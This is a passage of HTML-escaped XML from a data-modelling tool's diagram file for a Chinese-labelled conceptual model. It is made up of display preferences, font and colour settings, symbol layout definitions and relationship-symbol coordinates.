Id=&quot;o5&quot;&gt;&lt;a:ObjectID&gt;90E3187A-DBAA-4EE6-AC18-300D97652717&lt;/a:ObjectID&gt;&lt;a:Name&gt;表一&lt;/a:Name&gt;&lt;a:Code&gt;表一&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;0A29E6FF-59EC-4690-AAFB-D878AB26683D&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DisplayPreferences&gt;[DisplayPreferences][DisplayPreferences\\LDM][DisplayPreferences\\General]Adjust to text=YesSnap Grid=NoConstrain Labels=YesDisplay Grid=NoShow Page Delimiter=NoShow Links intersections=YesActivate automatic link routing=YesGrid size=800Graphic unit=2Window color=255 255 255Background image=Background mode=8Watermark image=Watermark mode=8Show watermark on screen=NoGradient mode=0Gradient end color=255 255 255Show Swimlane=NoSwimlaneVert=YesTreeVert=NoCompDark=0[DisplayPreferences\\Object]Show Icon=NoMode=0Trunc Length=80Word Length=80Word Text=!&amp;quot;&amp;quot;#$%&amp;amp;&amp;#39;()*+,-./:;&amp;lt;=&amp;gt;?@[\\]^_`&#123;|&#125;~Shortcut IntIcon=YesShortcut IntLoct=YesShortcut IntFullPath=NoShortcut IntLastPackage=YesShortcut ExtIcon=YesShortcut ExtLoct=NoShortcut ExtFullPath=NoShortcut ExtLastPackage=YesShortcut ExtIncludeModl=YesEObjShowStrn=YesExtendedObject.Comment=NoExtendedObject.IconPicture=NoExtendedObject.TextStyle=NoExtendedObject_SymbolLayout=ELnkShowStrn=YesELnkShowName=YesExtendedLink_SymbolLayout=ExtDpdShowStrn=YesExtendedDependency_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Stereotype&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;FileObject.Stereotype=NoFileObject.DisplayName=YesFileObject.LocationOrName=NoFileObject.IconPicture=NoFileObject.TextStyle=NoFileObject.IconMode=YesFileObject_SymbolLayout=Package.Stereotype=YesPackage.Comment=NoPackage.IconPicture=NoPackage.TextStyle=NoPackage_SymbolLayout=Display Model Version=YesEntity.Stereotype=YesEntity.Attributes=YesEntity.Attributes._Filter=所有属性 CDMPENTALLEntity.Attributes._Columns=Stereotype DomainOrDataType IdentifierIndicator NullIndicatorEntity.Attributes._Limit=-5Entity.Identifiers=YesEntity.Identifiers._Columns=Stereotype IdentifierIndicatorEntity.Comment=NoEntity.IconPicture=NoEntity.TextStyle=NoEntity_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Attributes&amp;quot; Collection=&amp;quot;Attributes&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nIdentifierIndicator No 标识符指标\\r\\nDataType No\\r\\nDomainOrDataType No 域或数据类型\\r\\nDomain No\\r\\nNullIndicator No 强制性&amp;quot; Filters=&amp;quot;所有属性 CDMPENTALL &amp;amp;quot;&amp;amp;quot;\\r\\n主属性 CDMPENTPK &amp;amp;quot;\\&amp;amp;quot;PIDTF \\&amp;amp;quot;TRUE\\&amp;amp;quot; TRUE\\&amp;amp;quot;&amp;amp;quot;\\r\\n识别属性 CDMPENTIDTF &amp;amp;quot;\\&amp;amp;quot;AIDF \\&amp;amp;quot;TRUE\\&amp;amp;quot; TRUE\\&amp;amp;quot;&amp;amp;quot;&amp;quot; HasLimit=&amp;quot;Yes&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Identifiers&amp;quot; Collection=&amp;quot;Identifiers&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nIdentifierIndicator No 标识符指标&amp;quot; HasLimit=&amp;quot;No&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Comment&amp;quot; Attribute=&amp;quot;Comment&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;LEFT&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Relationship.Entity1ToEntity2Role=YesRelationship.Entity2ToEntity1RoleCardinality=NoRelationship.Entity1ToEntity2RoleDominant=YesRelationship.Stereotype=YesRelationship.DisplayName=YesRelationship.JoinExpression=NoRelationship.Entity2ToEntity1Role=YesRelationship.Entity1ToEntity2RoleCardinality=NoRelationship.Entity2ToEntity1RoleDominant=YesRelationship_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Role&amp;quot; Attribute=&amp;quot;Entity1ToEntity2Role&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Role&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Cardinality&amp;quot; Attribute=&amp;quot;Entity2ToEntity1RoleCardinality&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Cardinality&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Dominance&amp;quot; Attribute=&amp;quot;Entity1ToEntity2RoleDominant&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Dominance&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Role&amp;quot; Attribute=&amp;quot;Entity2ToEntity1Role&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Role&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Cardinality&amp;quot; Attribute=&amp;quot;Entity1ToEntity2RoleCardinality&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Cardinality&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Dominance&amp;quot; Attribute=&amp;quot;Entity2ToEntity1RoleDominant&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Dominance&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Inheritance.Stereotype=YesInheritance.DisplayName=YesInheritance.IconPicture=NoInheritance.TextStyle=NoInheritance_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Entity.SubSymbols=YesAssociation.Stereotype=YesAssociation.Comment=NoAssociation.Attributes=YesAssociation.Attributes._Columns=Stereotype DomainOrDataType NullIndicatorAssociation.Attributes._Limit=-5Association.IconPicture=NoAssociation.TextStyle=NoAssociation_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Comment&amp;quot; Attribute=&amp;quot;Comment&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;LEFT&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Attributes&amp;quot; Collection=&amp;quot;Attributes&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nDataType No\\r\\nDomainOrDataType No 域或数据类型\\r\\nDomain No\\r\\nNullIndicator No 强制性&amp;quot; HasLimit=&amp;quot;Yes&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;AssociationLink.SymbolCardinality=YesAssociationLink.Stereotype=YesAssociationLink.Role=YesAssociationLink_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Cardinality&amp;quot; Attribute=&amp;quot;SymbolCardinality&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Cardinality&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Role&amp;quot; Attribute=&amp;quot;Role&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;[DisplayPreferences\\Symbol][DisplayPreferences\\Symbol\\FRMEOBJ]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=6000Height=2000Brush color=255 255 255Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=64Brush gradient color=192 192 192Brush background image=Custom shape=Custom text mode=0Pen=1 0 255 128 128Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\FRMELNK]CENTERFont=Arial,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 128 255Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\USRDEPD]CENTERFont=新宋体,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=2 0 128 0 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\FILO]OBJSTRNFont=新宋体,8,NOBJSTRNFont color=0 0 0DISPNAMEFont=新宋体,8,NDISPNAMEFont color=0 0 0LCNMFont=新宋体,8,NLCNMFont color=0 0 0AutoAdjustToText=YesKeep aspect=YesKeep center=YesKeep size=NoWidth=2400Height=2400Brush color=255 255 255Fill Color=NoBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 0 0 255Shadow color=192 192 192Shadow=-1[DisplayPreferences\\Symbol\\LDMPCKG]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=3600Brush color=255 255 192Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 178 178 178Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMENTT]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0AttributesFont=Arial,8,NAttributesFont color=0 0 0EntityPrimaryAttributeFont=新宋体,8,UEntityPrimaryAttributeFont color=0, 0, 0EntityForeignAttributeFont=新宋体,8,NEntityForeignAttributeFont color=0, 0, 0IdentifiersFont=Arial,8,NIdentifiersFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=4000Brush color=234 181 21Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 64 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMRLSH]SOURCEFont=新宋体,8,NSOURCEFont color=0, 0, 0CENTERFont=新宋体,8,NCENTERFont color=0, 0, 0DESTINATIONFont=新宋体,8,NDESTINATIONFont color=0, 0, 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMINHR]STRNFont=新宋体,8,NSTRNFont color=0, 0, 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0AutoAdjustToText=NoKeep aspect=NoKeep center=NoKeep size=YesWidth=1575Height=1000Brush color=250 241 211Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 64 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMLINH]CENTERFont=新宋体,8,NCENTERFont color=0, 0, 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 64 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\Free Symbol]Free TextFont=Arial,8,NFree TextFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\CDMPCKG]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=3600Brush color=255 255 192Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 178 178 178Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\ENTT]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0AttributesFont=Arial,8,NAttributesFont color=0 0 0EntityPrimaryAttributeFont=Arial,8,UEntityPrimaryAttributeFont color=0 0 0IdentifiersFont=Arial,8,NIdentifiersFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=4000Brush color=233 202 131Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 128 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\RLSH]SOURCEFont=新宋体,8,NSOURCEFont color=0 0 0CENTERFont=新宋体,8,NCENTERFont color=0 0 0DESTINATIONFont=新宋体,8,NDESTINATIONFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\ASSC]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AttributesFont=Arial,8,NAttributesFont color=0 0 0EntityPrimaryAttributeFont=新宋体,8,UEntityPrimaryAttributeFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=3000Brush color=208 208 255Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 128 255Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LINK]SOURCEFont=新宋体,8,NSOURCEFont color=0 0 0CENTERFont=新宋体,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 128 255Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\CDMINHR]STRNFont=新宋体,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0AutoAdjustToText=NoKeep aspect=NoKeep center=NoKeep size=YesWidth=1575Height=1000Brush color=233 202 131Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LINH]CENTERFont=新宋体,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\CDM]&lt;/a:DisplayPreferences&gt;&lt;a:PaperSize&gt;(8268, 11693)&lt;/a:PaperSize&gt;&lt;a:PageMargins&gt;((315,354), (433,354))&lt;/a:PageMargins&gt;&lt;a:PageOrientation&gt;1&lt;/a:PageOrientation&gt;&lt;a:PaperSource&gt;15&lt;/a:PaperSource&gt;&lt;c:Symbols&gt;&lt;o:RelationshipSymbol Id=&quot;o6&quot;&gt;&lt;a:ModificationDate&gt;1618325798&lt;/a:ModificationDate&gt;&lt;a:Rect&gt;((-18523,-20562), (-5412,-1236))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((-6812,-19362),(-17173,-19362),(-17173,-1636))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;4882&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;a:AutomaticRoutingState&gt;3&lt;/a:AutomaticRoutingState&gt;&lt;c:SourceSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o7&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o8&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Relationship Ref=&quot;o9&quot;/&gt;&lt;/c:Object&gt;&lt;/o:RelationshipSymbol&gt;&lt;o:RelationshipSymbol Id=&quot;o10&quot;&gt;&lt;a:ModificationDate&gt;1618325797&lt;/a:ModificationDate&gt;&lt;a:Rect&gt;((3001,-16612), (5700,-3562))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((4350,-3962),(4350,-15212))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;4627&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;c:SourceSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o11&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o7&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Relationship Ref=&quot;o12&quot;/&gt;&lt;/c:Object&gt;&lt;/o:RelationshipSymbol&gt;&lt;o:RelationshipSymbol Id=&quot;o13&quot;&gt;&lt;a:ModificationDate&gt;1618325812&lt;/a:ModificationDate&gt;&lt;a:Rect&gt;((13062,1746), (15462,11274))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((14282,10874),(14282,6409),(14262,6409),(14262,2474))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;4627&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;a:AutomaticRoutingState&gt;3&lt;/a:AutomaticRoutingState&gt;&lt;c:SourceSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o14&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o11&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Relationship Ref=&quot;o15&quot;/&gt;&lt;/c:Object&gt;&lt;/o:RelationshipSymbol&gt;&lt;o:RelationshipSymbol Id=&quot;o16&quot;&gt;&lt;a:ModificationDate&gt;1618325828&lt;/a:ModificationDate&gt;&lt;a:Rect&gt;((-19950,-776), 